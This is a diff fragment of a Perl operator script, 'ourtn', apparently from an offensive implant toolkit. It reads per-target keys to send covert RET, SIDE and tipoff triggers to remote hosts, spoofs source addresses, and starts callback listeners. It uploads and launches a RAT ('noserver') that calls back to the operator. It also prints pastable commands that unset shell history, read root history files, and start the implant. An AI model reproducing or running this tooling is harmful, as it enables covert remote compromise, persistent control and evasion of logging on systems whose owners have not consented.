+#	progprint($command_rc,$COLOR_SUCCESS,$COLOR_NOTE,
+#		  "Called as",STDOUT);
+#	exec($command_rc) ;
+#      }
+#      sleep 2 ;# give rc a chance to run
+    }
+  }#if $calledbynopen
+}#if $windowsredir
+
+unless ($calledbynopen or $debug) {
+  # For now only use icmptime if not redirecting via -irtun
+  #  unless ($debug) {
+  if ($tryicmptime) {
+    if (`which icmptime 2>&1 | grep -v "no icmptime"` and 
+	`which mkoffset 2>&1 | grep -v "no mkoffset"`) {
+      # Try icmptime to get $retoffset
+      progprint("Computing time offset to $targetip with icmptime/mkoffset\n".
+		"(no response will cause 20 second delay here):",STDOUT);
+      ($offsetmin) = `mkoffset -q $targetip 2>/dev/null` =~ /UTC_OFFSET=(-{0,1}\d+)/ ;
+      if (length $offsetmin) {
+	$retoffset = $offsetmin * 60 ;
+	progprint("UTC_OFFSET=${offsetmin}m (or ${retoffset}s)",STDOUT);
+      } else {
+	progprint("No icmptime response from $targetip",$COLOR_WARNING,STDOUT);
+      }
+    } else {
+      progprint("cannot computer offset with icmptime--missing icmptime or mkoffset in path",$COLOR_WARNING,STDOUT);
+    }
+  }#$tryicmptime
+}
+
+if ($rettrigger or $sidetriggerport) {
+  # we are about to start listener with this $command a bit below in parent
+  $command = "TARG_AYT=dum DNS_NAME=dum DNS_IP=dum DNS_SOA=dum $ftshellenv $ftshell $ftshellargs ish $irtunishparm -p $ishcallbackport -i 127.0.0.1 127.0.0.1" ;
+  progprint("ish listener command for RET or SIDE trigger:\n$command\n",STDOUT);
+}
+
+# MAKE SURE $command has the target IP as final argument (NOPEN parses that way
+# when using -irtun).
+if ($rettrigger) {
+  # Get key for $targetip from $opbin/varkeys/project/fqdn___IP/reticulum
+  @keyfiles = split(/\n/,`find $opbin/varkeys -follow -type f | grep "\/[^/]*${targetip}[^/]*\/reticulum\$"`) ;
+  if ($#keyfiles < 0) {
+    mymydie("Cannot proceed--no RE key file for $targetip in $opbin/varkeys.") ;
+  } elsif ($#keyfiles > 0) {
+    mywarn("More than one RE key file for $targetip. Using $keyfiles[0].") ;
+  }
+  open(IN,"< $keyfiles[0]") || mymydie("Cannot open $keyfiles[0]") ;
+  progprint("opening $keyfiles[0] for RET keys",STDOUT);
+  my $keystr = "" ;
+  while (<IN>) {
+    next if (/^\s*\#/) ;
+    next unless ($val) = /set cv[012] (.*)/ ;
+    $keystr .= "$val " ;
+    last if (/set cv2/) ;
+  }
+  close(IN) ;
+  chop($keystr) ; # extra space
+  mymydie("Invalid keys \"$keystr\" in $keyfiles[0]") if
+    (length($keystr) != 26 or ($keystr =~ /[^a-fA-F0-9 ]/) ) ;
+  # use it to build $opbin/trigger_ret.py $targetip \"key key key\" 0 $callbackip $ishcallbackport
+  if ($ishcallbackip) {
+    mymydie("$opbin/pyside/trigger_ret.py not found")
+      unless (-x "$opbin/pyside/trigger_ret.py") ;
+    $command2 = "$opbin/pyside/trigger_ret.py $targetip \"$keystr\" ${retoffset}s $ishcallbackip $ishcallbackport 2>/dev/null" ;
+  } else {
+    mymydie("Cannot proceed with -R: do not know where I am coming from");
+  }
+} elsif ($sidetriggerport) {
+  my $sidetargetip = $targetip ;
+
+  # Get key for $targetip from $opbin/varkeys/project/fqdn___IP/sidetrack
+  @keyfiles = split(/\n/,`find $opbin/varkeys -follow -type f | grep "\/[^/]*_${targetip}\/sidetrack\$"`) ;
+  my $keyfile = shift(@keyfiles) ;
+  if (! $keyfile) {
+    mymydie("Cannot proceed--no ST key file for $targetip in $opbin/varkeys.") ;
+  } elsif ($#keyfiles >= 0) {
+    mywarn("More than one ST key file for $targetip. Using $keyfile.") ;
+    mywarn("Others include: (@keyfiles)");
+  }
+  open(IN,"< $keyfile") || mymydie("Cannot open $keyfile") ;
+  progprint("opening $keyfile for ST keys",STDOUT);
+  my $keystr = "" ;
+  while (<IN>) {
+    next if (/^\s*\#/) ;
+    last if ($keystr) = /export CV=\"([ a-f0-9]*)\"/i ;
+  }
+  close(IN) ;
+  mymydie("Invalid keys \"$keystr\" in $keyfile") if
+    (length($keystr) != 35);
+  # use it to build $opbin/trigger_side.py $targetip \"key key key key\" 0 $callbackip $ishcallbackport
+#  $sidetargetip = "127.0.0.1" if $calledbynopen ;
+  if ($ishcallbackip) {
+    mymydie("$opbin/pyside/trigger_side.py not found")
+      unless (-x "$opbin/pyside/trigger_side.py") ;
+    #TODO: Do we need the final argument $sideccip? Not in usage
+    $command2 = "$opbin/pyside/trigger_side.py $sidetargetip \"$keystr\" ${retoffset}s $ishcallbackip $ishcallbackport $sidetriggerport $sideccport $sideccip 2>/dev/null" ;
+    $command2 = "$opbin/pyside/trigger_side.py $sidetargetip \"$keystr\" ${retoffset}s $ishcallbackip $ishcallbackport $sidetriggerport $sideccport $sideccip 2>/dev/null" ;
+  } else {
+    mymydie("Cannot proceed with -A|a: do not know where I am coming from (ish callback IP)");
+  }
+#   Deprecated
+# } elsif ($usehector) {
+} elsif ($tipofftrigger) {
+  $command2 = "" ;
+  my $proto = " --target-protocol udp" ; # default
+  $triggerport = $opt_y if ($opt_y == int($opt_y) and portcheck($opt_y,1,59999)) ;
+  my $ddtargetport = " --target-port $triggerport";
+  if ($sportparm) {
+    $proto = " --target-protocol tcp";
+  } elsif ($tipofftrigger eq "icmp") {
+    $ddtargetport = "" ;
+    $proto = " --target-protocol $tipofftrigger" ;
+  }
+  $tipoffargs = " $tipoffargs";
+  if ((my $tt,$t) = $tipoffargs =~ /( -r|--target-protocol)\s*(\S+)/) {
+    $tipoffargs =~ s/-$tt\s*$t// ; # Get rid of this here--we build it in $proto
+    $proto = " --target-protocol $t" ;
+    if ($t =~ /^\d+$/) {        # number
+      $ddtargetport = "" unless ($t == 6 or $t == 17)
+    } else {                    #string 
+      $ddtargetport = "" unless ($t eq "tcp" or $t eq "udp")
+    }
+    if ($calledbynopen and !$ddtargetport and !($tipofftrigger eq "icmp")) {
+      mymydie("Cannot redirect DD non-IP triggers via -irtun yet.");
+    }
+  } 
+  $targetip = $target if ($target and !$targetip) ;
+  $spoofip = $ishcallbackip unless $spoofip;
+  # Set new VA specific parameters to tipoff
+  my ($valtipoffargs) = ();
+  if ($valtrigger) {
+  # E.g.: tipoff --target-address 555.1.2.201 --target-protocol tcp --target-port 908 --callback-address 555.1.2.30 --callback-port 8833 --command-id 1 --start-other /current/bin/dragonbits --other-args "-U -D -d/tmp -e PATH=/tmp -e D=-I -u /current/up/morerats/noserver-3.0.3.2-i586.pc.linux.gnu:noserver4 -x noserver4 -r"
+    $tipoffargs .= " --command-id 1"; # VA in action
+    $tipoffargs .= " --start-other $opbin/dragonbits";
+    $workingdir = "/tmp" unless $workingdir;
+    $tipoffargs .= " --other-args \"-U -D -d$workingdir -e PATH=$workingdir -e D=-I -u $uploadfile:$ratname -x $ratname -r\"";
+    undef $ftshellenv;
+    undef $ftshell;
+    undef $ftshellargs;
+  } else {
+    if ($binaryupload) {
+      undef $ftshellenv;
+      undef $ftshell;
+      undef $ftshellargs;
+      $tipoffargs .= " $tipoffexecuteoption $uploadspecific";
+    } else {
+      $tipoffargs .= " --start-ish";
+    }
+  }
+  my $vianopen = "--raw-send 127.0.0.1:$windowsport" if $calledbynopen ;
+  unless ($key =~ /$targetip/) {
+    $key = "DD_NEEDS_NO_KEY_FOR_$targetip";
+  }
+  $ishcallbackip = "0.0.0.0" if $ishcallforward;
+  $embeddedIPintrigger = "--trigger-address $targetip" if ($opt_G and ($opt_5 or $opt_J));
+  $command = "keys=$key DNS_IP=$spoofip $ftshellenv $ftshell $ftshellargs $tipoffprog $vianopen$proto$ddtargetport --callback-address $ishcallbackip --source-address $spoofip --callback-port $ishcallbackport $tipoffargs $embeddedIPintrigger $tipofftimeoffset --target-address $targetip" ;
+  $command =~ s/\s+/ /g;
+  $command =~ s/^\s*//;
+# $ipparm $portparm $sportparm $localparm $targetip" ;
+} else {
+  # not $rettrigger or $sidetriggerport so triggering via normal UDP
+  # 4.51: Or perhaps via new ish triggers via -s[yYJ]
+  if (length($offsetmin)) {
+    $utcoffset = "UTC_OFFSET=$offsetmin " ;
+  }
+  $command2 = "" ;
+  if ($ishtunneltarget) {
+    unlink("$opdir/.ishtunnelcommand");
+    my $portparm2 = $portparm ;
+    $portparm2 =~ s/-p/-localPort/ ;
+    my $spoofparm = "" ;
+
+    $command2 = "tunnel -keys=$ishtunnelkeys $portparm2 $localparm $intfarg $spoofparm $ishtunnelargs -target $targetip | tee $opdir/.ishtunnelcommand | egrep -v \"copy.and.paste|ftshell\"" ;
+    $command = "keys=$key $intfarg2 ${utcoffset}$dnsipenv $ftshellenv $ftshell $ftshellargs $spayedfile $ipparm $portparm $sportparm $localparm $irtunishparm ISHTUNNELARGS $targetip" ;
+  } else {
+    $command = "keys=$key $intfarg2 ${utcoffset}$dnsipenv $ftshellenv $ftshell $ftshellargs $spayedfile $ipparm $portparm $sportparm $localparm $irtunishparm $targetip" ;
+  }
+}
+
+if ($command2) {
+  if ($debug) {
+    my $donewhat = "Before sending ish trigger to $targetip, ".
+      "INCISION tunnel will be set up via $ip{$ishtunneltarget} with" ;
+    $donewhat = "After ish listened, would have sent RET/SIDE trigger with"
+      if ($rettrigger or $sidetriggerport) ;
+    $donewhat = "INSTEAD of ish listener, will be running this to upload binary"
+      if ($binaryupload) ;
+    progprint("$donewhat:$COLOR_NORMAL\n$command2",STDOUT);
+  }
+  if ($rettrigger or $sidetriggerport) {
+    mymydie("SIDE trigger requires $sttunmodule")
+      unless (-e "$sttunmodule" or $rettrigger or $ishtunneltarget); # this error only needed for SIDE not RET triggering
+  }
+  if (!$debug and !forkit()) {
+    if ($rettrigger or $sidetriggerport) {
+      chomp(my $tmp = `ifconfig 2>/dev/null | grep eth0`) ;
+      unless ($tmp) {
+	progprint("Bringing up eth0--required by sttunctl",STDOUT);
+	system("/sbin/ifup eth0") ;
+      }
+      progprint("Loading modules in case not already there (ip_conntrack $sttunmodule):",STDOUT);
+      print `insmod ip_conntrack` ;
+      print `insmod $sttunmodule` ;
+      if ($tmp = `ps -efw | grep sttunctl | grep -v grep`) {
+	progprint("Not starting sttunctl. Already running:\n\t$tmp",STDOUT);
+      } else {
+	my $intf = "ppp0" if `ifconfig 2>/dev/null | grep ppp0` ;
+	$intf = "eth0" unless $intf ;
+	progprint("Starting sttunctl -o $intf",STDOUT);
+	system("$opbin/pyside/sttunctl -o $intf");
+      }
+      sleep 2 ;
+      $command2 = swapips($command2,$targetip,$actualtriggerdest) ;
+      progprint("After ish listens, will send RET/SIDE trigger with:$COLOR_NORMAL\n$command2",STDOUT);
+      sleep 1 until (-e "/tmp/dotrigger") ;
+      sleep 3 ;
+      unlink ("/tmp/dotrigger") ;
+      progprint("child sending ST/IN trigger now".`date -u "+%C%y%m%d-%RZ"`,STDOUT);
+    } elsif ($ishtunneltarget) {
+      progprint("Starting tunnel command in background with:$COLOR_NORMAL\n$command2",STDOUT);
+      unless (-e "$opbin/tn.barebones") {
+	rename("$opbin/tn","$opbin/tn.barebones") or mywarn("Cannot rename $opbin/tn");
+      }
+      copy("$opbin/tn.spayed","$opbin/tn") or mymydie("Cannot copy $opbin/tn.spayed $opbin/tn");
+      chmod (0777,"$opbin/tn");
+    }
+    exec($command2) unless $debug ;
+  }
+}
+
+$addip = 0;
+@bad_in_rules = ();
+@bad_out_rules = ();
+unless($platformtarget || $noiptables) {
+  foreach $chain ("INPUT", "OUTPUT") {
+    @rules = split(/\n/, `iptables -L $chain -n -v`);
+    if($rules[0] =~ /policy (DROP|REJECT)/) {
+      for($i = 2; $i < scalar(@rules); $i++) {
+        last if($rules[$i] =~ /ACCEPT .* $targetip/);
+        if($rules[$i] =~ /(REJECT|DROP) .* $targetip/) {
+          if($chain eq "INPUT") {
+            push(@bad_in_rules, $rules[$i]);
+          }
+          else {
+            push(@bad_out_rules, $rules[$i]);
+          }
+        }
+      }
+      $addip = ($i == scalar(@rules)) ? 1 : 0;
+    }
+    elsif($rules[0] =~ /policy ACCEPT/) {
+      for($i = 2; $i < scalar(@rules); $i++) {
+        if($rules[$i] =~ /(REJECT|DROP) .* $targetip/) {
+          if($chain eq "INPUT") {
+            push(@bad_in_rules, $rules[$i]);
+          }
+          else {
+            push(@bad_out_rules, $rules[$i]);
+          }
+        }
+      }
+    }
+  }
+}
+if(!$calledbynopen) {
+  if(scalar(@bad_in_rules) || scalar(@bad_out_rules)) {
+    progprint("Bad iptables rules that need fixing:\nINPUT chain:\n@bad_in_rules\n\nOUTPUT chain:\n@bad_out_rules", $COLOR_FAILURE, STDOUT);
+    getinput("Try fixing it yourself. Hit enter to continue, ^C to abort here.");
+  }
+  # Never mind about fwrules.py if -G $actualtriggerdest points locally
+  $addip = 0 if ($actualtriggerdest =~ /^(192\.168|10|127)\./);
+  if($addip and !$windowsredir) {
+    $fwcmd = "fwrules.py -t 5h -A $targetip -p";
+    my ($ans) = getinput
+      (
+       "You are triggering $targetip, which currently is blocked by FW rules.\n\n".
+       "Be$COLOR_FAILURE SURE$COLOR_NORMAL that this is an IP you can access directly\n".
+       "from $gbl_externalIP!!\n\n".
+       "     $fwcmd\n\n".
+       "Do you want $prog to add that IP by running the above command?","Y"
+      );
+    mydie("User aborted") unless ($ans =~ /^\s*y/i);
+    progprint("Allowing $targetip through firewalls with:\n$fwcmd\n\n", $COLOR_NOTE, STDOUT);
+    if(system($fwcmd) != 0) {
+      progprint("Could not set firewall rules!", $COLOR_FAILURE, STDOUT);
+      getinput("Try fixing it yourself. Hit enter to continue, ^C to abort here.");
+    }
+  }
+}
+
+#%rulestoadd = () ;
+#my $once = 0 ;
+#unless ($platformtarget) {
+#  foreach $chain ("INPUT","OUTPUT") {
+#    while ((@badlines)= split(/\n/, `iptables -L $chain -n | egrep "$targetip " | egrep -v ACCEPT`)) {
+#      my $badlines = "" ;
+#      $badlines .= "\n$_" foreach (@badlines) ;
+#      progprint("$badlines",$COLOR_WARNING,$COLOR_NOTE,"iptables rules about $targetip",STDOUT) 
+#	unless $once++;
+#      unless (local ($type) = "@badlines" =~ /(REJECT|DROP)/) {
+#	progprint("Unable to correct this iptables rule:\n@badlines",$COLOR_FAILURE,STDOUT);
+#	getinput("Try fixing it yourself. Hit enter to continue, ^C to abort here.");
+#	next ;
+#      }
+#      my $ruledel = "iptables -D $chain --dst $targetip -j $type" ;
+#      my $ruleadd = "iptables -A $chain --dst $targetip -j $type" ; 
+#      if (!$calledbynopen) {
+#	# Allow this filter if ourtn's "first" target is actually tunneled to
+#	# via INCISION tunneling -7
+#	mymydie("Cannot continue--first ourtn hop cannot be filtered. ".
+#	      "Delete iptables rule with:\n\n$ruledel") unless $ishtunneltarget;
+#      }
+#      $rulestoadd{$ruleadd}++ ;
+#      last if ($debug) ;
+#      if ($noiptables) {
+#	progprint("\n$ruledel\n","$COLOR_WARNING","$COLOR_NOTE","NOT deleting iptables rule so this will likely fail.\nThis rule would delete the problem entry",STDOUT);
+#	getinput("You can try fixing it yourself, or not. Hit enter to continue with -irtun or ^C to abort.");
+#	last ;
+#      } else {
+#	progprint("$ruledel","$COLOR_SUCCESS","$COLOR_NOTE","Deleting iptables rule with",STDOUT);
+#	system("$ruledel") ;
+#      }
+#    } # end while iptables stuff to modify
+#  } # end foreach $chain
+#} # end unless $platformtarget (ignore iptables)
+# eliminate extra spaces introduced by $*parms
+$command =~ s/  / /g ;
+$command2 =~ s/\s+/ /g;
+if (1 or ! $debug) { #fire in the hole
+#  my @noservers = split (/\n/,`ls -1 /current/up/noserver* | grep -v "uu\$"`) ;
+  # add one more if there: the last one listed in morerats that is for sparc.*2.5.1
+  my @onemore = split(/\n/,`find /current/up | grep noserver.*sparc.sun.solaris.*2.5.1 | sort`) ;
+#find /current/up | grep noserver*sparc.sun.solaris.*2.5.1 | tail -1`) ;
+  if (@onemore) {
+    push (@noservers,@onemore) ;
+  }
+  if ($noftshell) {
+    $uncompress = "uncompress $ratname.Z ; " ;
+    foreach $t (@noservers) {
+      $filetransfer .= "packrat $ratname $t ; gedit $ratname.uu &\n" ;
+    }
+    if ($filetransfer) {
+      $filetransfer = "
+$filetransfer
+uudecode.pastable
+" ;
+    } else {
+      $filetransfer = "
+packrat $ratname /current/up/noserver ; gedit $ratname.uu &
+
+uudecode.pastable
+" ;
+    }
+    $filetransfer = "${COLOR_NOTE}${filetransfer}${COLOR_WARNING}" ;
+  } else {#!$noftshell
+    foreach $t (@noservers) {
+      $filetransfer .= "$t $ratname\n" ;
+    }
+    if ($filetransfer) {
+      $filetransfer = "\n~~p\n".$filetransfer ;
+    } else {
+      $filetransfer = "\n~~p\n/current/up/noserver $ratname\n" ;
+    }
+  }
+  if ($callbackip) {
+    $callback = "
+${COLOR_NOTE}
+-call $callbackip $nopenport
+
+-nrtun $nopenport
+${COLOR_WARNING}
+ls -lart | tail
+${uncompress}chmod 700 $ratname&&netstat -an|grep $nopenport.*LISTEN || (PATH=. D=-uc$callbackip:$nopenport $ratname || cat /dev/null > $ratname)
+ls -lart | tail
+
+${COLOR_NOTE}cd $opdown
+$opbin/noclient -l $nopenport";
+  }
+# TODO: add more /.*noserver lines
+# TODO: Figure out why extra ourtn pid never exits...
+  if ($ishtunneltarget and !$debug) {
+    my $howlong = 0 ;
+    until (-s "$opdir/.ishtunnelcommand") {
+      sleep 2 ;
+      my $waittime = 20 ;
+      $howlong += 2 ;
+      if ($howlong > $waittime) {
+	mymydie("Cannot go on. Waiting over $waittime seconds for $opdir/.ishtunnelcommand to appear.");
+      }
+    }
+    $howlong = 0 ;
+    my $tunnelargs = "" ;
+    until ($tunnelargs or $howlong > 30) {
+      sleep 2 ;
+      $howlong += 2 ;
+      chomp($tunnelargs = `grep ftshell $opdir/.ishtunnelcommand 2>/dev/null`) ;
+    }
+    mymydie("Cannot find ftshell command after tunnel established in $opdir/.ishtunnelcommand\n".
+	  "This is usually caused when there is no callback from IN/pipe.\n".
+	  "This may be due to an older IN on the box not having pipe built in?\n".
+	  "(That is, 4.10 or better.)\n".
+	  "Or the IN target is not there?\n".
+	  "Or the IN target is not answering (key?/offset?)?\n".
+	  "Or maybe you should figure it out yourself....I'm tired.\n"
+	 )
+      unless $tunnelargs;
+    $tunnelargs =~ s/.*((-l\s+){0,1}-g.*-n).*/$1/ ;
+    $command =~ s/ISHTUNNELARGS/$tunnelargs/ ;
+  }
+  $command = swapips($command,$targetip,$actualtriggerdest) ;
+  my $how = "system";
+  $how = "exec" if $valtrigger;
+  progprint("issuing ${how}(\"
+$command
+\")",STDOUT) unless $debug;
+  $cddir .= " ;" if $cddir;
+  $useful = "\n".
+            "${COLOR_FAILURE}One or more of these might be useful ${COLOR_NOTE}(BLUE==local${COLOR_WARNING} YELLOW==remote)\n".
+            "\n".
+            "unset HISTFILE\n".
+            "unset HISTFILESIZE\n".
+            "w ;$cddir ls -lart / ${workingdir}\n".
+            "pwd ; date ; date -u\n".
+            "ls -al /root/.*history ; tail /root/.*history ; ls -al /.*history ; tail /.*history\n".
+            "HOME=\"\" which uudecode uncompress perl ; uname -a\n".
+            "\n".
+            "ps -ef\n".
+            "$filetransfer\n".
+            "ls -lart | tail\n".
+            "${uncompress}chmod 700 $ratname&&netstat -an|grep $nopenport.*LISTEN || (PATH=. D=-ul$nopenport $ratname || cat /dev/null > $ratname)\n".
+            "ls -lart | tail\n".
+	    "" ;
+  unless ($spoofip) {
+    $useful .= "\n".
+               "${COLOR_NOTE}cd $opdown\n".
+               "$opbin/noclient $targetip:$nopenport" ;
+  }
+  $useful .= "\n$callback\n${COLOR_NORMAL}";
+  #print $useful unless ($debug or $uploadfile or $uploadspecial) ;
+  my $tmp = "" ;
+  #unlink("$opbin/useful");
+  #while (-e "$opbin/useful") {
+  #  $tmp++ ;
+  #  rename("$opbin/useful","$opbin/useful.old$tmp")
+  #    unless (-e "$opbin/useful.old$tmp") ;
+  #}
+  #if (open(OUT,"> $opbin/useful")) {
+  #  print OUT "#!/usr/bin/env perl\n".
+  #            "\$SIG{INT} = \\&my_exit;\n".
+  #            "\$SIG{TERM} = \\&my_exit;\n".
+  #            "print <<\"EOF\"\n".
+  #            "${useful}\n".
+  #            "${COLOR_FAILURE}^C will kill this window, or it will die when ourtn exits ${COLOR_NOTE}(BLUE==local${COLOR_WARNING} YELLOW==remote)${COLOR_NORMAL}\n".
+  #            "EOF\n".
+  #            "\n".
+  #            ";\n".
+  #            "sleep ;\n".
+  #            "\n".
+  #            "sub my_exit {\n".
+  #            "  exit\n".
+  #            "}\n".
+  #            "";
+  #  close(OUT) ;
+  #  chmod (0755,"$opbin/useful");
+  #  if (!$debug and !$executefile and !($kidpid = forkit()) ) {
+  #    exec("1x -geometry 115x32+0+0 -title Useful-Pastables-from-ourtn -e $opbin/useful 2>/dev/null ");
+  #  }
+  #  # oops no need anymore    push(@kidpids,$kidpid);
+  #}
+dbg("
+at if
+callbackip=$callbackip= 
+callbacktoip=$callbacktoip= 
+
+callback=$callback=
+opt_c=$opt_c=
+opt_C=$opt_C=
+");
+
+  if ($executefile) {
+    $doafterftshell = "" ;
+    $noclientdoafterftshell = "" ;
+    $nopenautothereprevious = "" ;
+    $pastables = "" ;
+    if ($valtrigger) {
+      didthis("#via UnixVal trigger",$calledbynopen ? "" : "noclient");
+    } else {
+      if ($callbackip) {
+	$noclientdoafterftshell .= "-nrtun $nopenport" ;
+	$morenoclientdoafterftshell .= "\nnoclient -l $nopenport\n\n-call $callbackip $nopenport\n" ;
+	if ($calledbynopen or !($callbackip eq $myip)) {
+	  print("Some potentially useful pastables (not all):\n\n${partialdidthis}-nrtun $nopenport\a\n");
+	  didthis("-nrtun $nopenport","callother");
+	} elsif ($callbackip eq $myip) {
+	  print("${partialdidthis}${COLOR_FAILURE}noclient -l $nopenport\a\n\n");
+	  didthis("noclient -l $nopenport","callother");
+	  $doafterftshell .= "$opbin/noclient -l $nopenport" ;
+	}
+dbg("
+inside if
+callbackip=$callbackip= 
+callbacktoip=$callbacktoip= 
+
+callback=$callback=
+opt_c=$opt_c=
+opt_C=$opt_C=
+");
+	if ($callbackip eq $callbacktoip) {
+	  my $partialdidthis = "" ;
+	  unless ($debug or $platformtarget) {
+	    if ($calledbynopen or !($callbackip eq $myip)) {
+	      print(
+		    "$morenoclientdoafterftshell".
+		    "${COLOR_NOTE}\n".
+		    "You must start noclient listener ${COLOR_FAILURE}on $callbackip$COLOR_NOTE with\n".
+		    "this (ourtn will NOT do this since you used -C to some other IP than $myip):\n") ;
+	    } else {
+	      print("${COLOR_NOTE}\n".
+		    "You asked for a NOPEN callback to $myip, this box. So $prog will exec a\n".
+		    "noclient listener later with this:\n\n") ;
+	    }
+	    if (-s "$opdown/didthis") {
+	      $partialdidthis .= "\ncd /current/down\n";
+	      if (open(IN,"< $opdown/didthis")) {
+		while (<IN>) {
+		  last if /-nrtun/ ;
+		  $partialdidthis .= $_;
+		  next if /^\#/ ;
+		  last if /$callbackip/ ;
+		}
+		close(IN) ;
+	      }
+	      $partialdidthis .= "\n";
+	    }
+	    # do not prompt user here if -T is used
+	    if ( -s "$opetc/multitargets" and $ENV{OURTNWINDOW}) {
+	      # If -autopilot 19191 is in here, replace it with a -gs checklast AFTER
+	      # the -irtun. Then when next hop exits, that is there and will get run then.
+	      if (open(IN,"< $opetc/nopen_auto.$nopen_mypid")) {
+		my @autolines = <IN>;
+		foreach (@autolines) {
+		  next if ($_ eq "#NOGS\n");
+		  if (/-autopilot 19191/) {
+		    $nopenautothereprevious .= "${nohist}-gs checklast\n";
+		  } else {
+		    $nopenautothereprevious .= $_;
+		  }
+		}
+	      }
+	      close(IN);
+	      # More to do, so tell this noclient that (-gs auto takes care of rest)
+	      if (open(OUT,"> $opetc/nopen_auto.$nopen_mypid")) {
+		print OUT "#NOGS\n".
+			  "${nohist}-gs auto\n";
+		close(OUT) ;
+	      } else {
+		print "
+${COLOR_FAILURE}$prog"."[$$]: Could not write to $opetc/nopen_auto.$nopen_mypid\n";
+	      }
+	    }
+	    getinput("Hit return when ready.$COLOR_NORMAL")
+	      unless ($nointeraction or $platformtarget);
+	  }
+	} else {
+	  unless ($uploadspecific or $uploadspecial) {
+	    my $what = "nopen is uploaded and";
+	    $what = "$uploadspecific is uploaded and" if $uploadspecific;
+	    $what = "$uploadspecial is" if $uploadspecial ;
+	    print "
+${COLOR_NOTE}Once $what executed and after about $noservercallbackdelaysecs seconds,
+the nopen server will call back to the listener started up with:$COLOR_NOTE
+" ;
+	  }
+	}
+      } else {# not callback
+	print "
+${COLOR_NOTE}Once nopen is uploaded and executed, you will be connected to it automatically.\n";
+	my $nopentarget = $targetip;
+	$nopentarget = $actualtriggerdest
+	  if $actualtriggerdest;
+	$noclientdoafterftshell .= "-nstun $nopentarget $nopenport" ;
+	if ($windowsredir) {
+	  $doafterftshell .= "$opbin/noclient $windowsip:$nopenport" ;
+	} else {
+	  $doafterftshell .= "$opbin/noclient $nopentarget:$nopenport" ;
+	}
+      }# end if $callbackip or not
+      # now print out what we're going to do
+      $pastables .= "\n".
+	"$noclientdoafterftshell$morenoclientdoafterftshell\n".
+	"$COLOR_NORMAL\n".
+	"OR\n".
+	"$COLOR_NOTE\n".
+	"cd $opdown\n".
+	"${doafterftshell}\n".
+	"";
+      $noclientdoafterftshell = ""
+	unless ($calledbynopen and !($callback and ($callbackip eq $callbacktoip))) ;
+
+      $pastables = "$COLOR_NOTE$pastables$COLOR_NORMAL\n" ;
+      print "Here are some pastables for use in other windows$didthis:
+
+$pastables" unless ($debug or $platformtarget) ;
+    }
+  }# end if $executefile
+
+  #  if ($debug) {
+#    mywarn("at this point, without -d we would have run system(\"\n\n$command\n\n\").");
+#  } else {
+  if (!$calledbynopen) {
+    if (!$burnthewitch and
+	@autogetfiles = split(/\n/,`ls -1 $opetc/autoget.*[0-9] 2>/dev/null`) and
+	$executefile
+       ) {
+      print("$COLOR_NOTE
+There are autoget files:\n\n") ;
+      foreach $autogetfile (@autogetfiles) {
+	print "::::::::::::::\n$autogetfile\n::::::::::::::\n";
+	print `cat $autogetfile`."\n" ;
+      }
+      my $ans =
+        getinput("${COLOR_NOTE}Do you want to burn NOPEN hosts once autoget is done?","Y","N") unless $nointeraction;
+      if ($nointeraction or $ans =~ /^y/i) {
+        $burnthewitch = 1 ;
+        `touch $opetc/burnthewitch` ;
+	mywarn("Ok. Setting to burn.",$COLOR_NOTE) ;
+      } else {
+	$burnthewitch = 0 ;
+        `touch $opetc/donotburnthewitch` ;
+	mywarn("Ok. The later autoget hops will burn, but not the first hop.",$COLOR_WARNING) ;
+	sleep 2 ;
+      }
+    }
+  } else {#$calledbynopen = yes
+    $burnthewitch = 1 if (-e "$opetc/burnthewitch") ;
+  }
+  if (!$debug) {
+    if ($valtrigger) { # special case for VA we do not need/use ftshell, so we can exec
+      $workingdir =~ s,/,_\+_,g;
+      my $wipefile = "${workingdir}_+_$ratname";
+      # First we touch this file so noclient/autodone knows to wipe this file remotely
+      `touch $optmp/noclient.$$.wipefile.$wipefile`;
+      exec($command);
+      exit;
+    }
+    # Fork here. have child check that parent's $command does not hang. Puts up killit window if it does.
+    $tmp =`promptkill -v` ;
+#$tmp="promptkill version 1.3";#DBG
+    if ($calledbynopen and $nopen_mylog and $tmp and ! ($tmp =~ /not found/i)) {
+      my $tagpid = $$ ;
+      my $processtocheck = "ish";
+      if ($tipoffprog =~ /(BIN|[-_][43].[X123456])/) {
+	$processtocheck = $tipoffprog;
+	dbg("Changing from ish to =$tipoffprog=");
+      }
+      unlink("/current/processdone.$tagpid") ;
+      my $kidpid = forkit() ;
+      if (! $kidpid) {
+	# child
+	my $count = 0 ;
+	my $c = 0 ;
+	my $diecount = 0 ;
+	my $killpidextra = 0 ;
+	$killpidextra += 10 if ($binaryupload or ($tipoffprog =~ /(BIN|[-_][43].[X123456])/));
+	my $ishcount = "grep -A1 \"Received remote connection\" \"$nopen_mylog\" | grep \"Received connect from \" | wc -l" ;
+	my $previouscount = `$ishcount` ;
+	$previouscount =~ s/\s+//g ;
+	while (! -e "/current/processdone.$tagpid") {
+	  sleep 2 ;
+	  $c+=2 ; $count++ ;
+	  if ($c >= $ishactivitywaitsecs) {
+	    chomp(my $ishpid = `ps -ef | grep " $processtocheck " | grep -v grep | awk '{print \$2}'`) ;
+		$ishpid = join(":",reverse split(/\s+/, $ishpid));
+	    if ($ishpid) {
+	      my $currentcount = `$ishcount` ;
+	      $currentcount =~ s/\s+//g ;
+	      # If after $ishactivitywaitsecs seconds he hasn't called back
+	      # OR after $ishactivitymaxwaitsecs the callback/upload is not doneishac
+	      # use promptkill to see if we want to kill off ish
+	      if (($c > $ishactivitywaitsecs + $killpidextra and $currentcount == $previouscount) or $c >= $ishactivitymaxwaitsecs) {
+		unless (forkit()) {
+		  dbg("RUNNING:\n\n".
+		      "====promptkill $ishpid /current/processdone.$tagpid \"ourtn\[$$\]\" $opetc/nopen_auto.$nopen_mypid 2>/dev/null&====") ;
+		  exec("promptkill $ishpid /current/processdone.$tagpid \"ourtn\[$$\]\" $opetc/nopen_auto.$nopen_mypid 2>/dev/null&") ;
+		}
+	      }
+	    } else {
+	      next unless ($diecount++ > 10) ;
+#	      mywarn("Must die--see no ish and no /current/processdone.$tagpid",$COLOR_FAILURE) ;
+	      close (STDOUT) ;
+	      close (STDIN) ;
+	      close (STDERR) ;
+	      done();
+	      exit ;
+	    }
+	  }
+	}
+	if (-e "/current/processdone.$tagpid") {
+	  # child dies quietly - parent takes over and determines success
+	  close (STDOUT) ;
+	  close (STDIN) ;
+	  close (STDERR) ;
+                do {
+                    $kid = waitpid(-1, WNOHANG);
+                } until $kid > 0;
+	  waitpid($kidpid,NULL) ;
+	  exit;
+	} else {
+	  progprint("Promptkill part of if not dead yet...dying now.\n",STDOUT);
+	  exit;
+	}
